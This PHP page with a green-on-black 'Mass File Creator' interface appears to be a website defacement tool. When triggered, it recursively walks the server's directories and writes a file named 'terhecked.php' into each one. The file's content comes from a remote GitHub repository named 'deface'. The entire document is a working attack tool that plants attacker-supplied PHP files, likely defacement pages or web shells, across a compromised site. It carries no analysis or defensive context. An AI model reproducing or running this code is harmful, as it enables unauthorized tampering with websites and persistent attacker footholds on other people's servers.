<?php
// mass_create.php
if (isset($_GET['action']) && $_GET['action'] === 'start') {
    header('Content-Type: text/event-stream');
    header('Cache-Control: no-cache');

    $targetFile = "terhecked.php";
    $sourceUrl = "https://raw.githubusercontent.com/FreedomSec1337/deface/refs/heads/main/terge.txt";
    $maxDepth = 3;

    function createFileRecursive($dir, $depth = 0) {
        global $targetFile, $sourceUrl, $maxDepth;

        echo "data: Scanning folder: $dir\n\n";
        flush();

        if ($depth >= $maxDepth) return;

        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $file;

            if (is_dir($path)) {
                createFileRecursive($path, $depth + 1);
            }
        }

        $filePath = $dir . DIRECTORY_SEPARATOR . $targetFile;
        if (!file_exists($filePath)) {
            $content = @file_get_contents($sourceUrl);
            if ($content === false) {
                echo "data: [!] Failed to fetch content from URL\n\n";
                flush();
                return;
            }
            file_put_contents($filePath, $content);
            echo "data: [+] Created: $filePath\n\n";
            flush();
        } else {
            echo "data: [-] Exists: $filePath\n\n";
            flush();
        }
    }

    echo "data: === Starting mass file creation ===\n\n";
    flush();
    createFileRecursive(getcwd());
    echo "data: === Done ===\n\n";
    flush();
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Mass File Creator 🚀</title>
<style>
body { background:#111;color:#0f0;font-family:monospace;padding:10px; }
#output { background:#000;color:#0f0;padding:10px;height:400px;overflow:auto;border:1px solid #0f0; }
button { padding:10px 20px;margin:10px;background:#0f0;color:#000;font-weight:bold;border:none;cursor:pointer; }
</style>
</head>
<body>
<h1>Mass File Creator 🚀</h1>
<button id="startBtn">GAS</button>
<div id="output"></div>

<script>
const output = document.getElementById("output");
document.getElementById("startBtn").onclick = () => {
    output.innerHTML = "";
    const evtSource = new EventSource("?action=start");
    evtSource.onmessage = function(e) {
        output.innerHTML += e.data + "<br>";
        output.scrollTop = output.scrollHeight;
    }
    evtSource.onerror = function() {
        evtSource.close();
    }
};
</script>
</body>
</html>
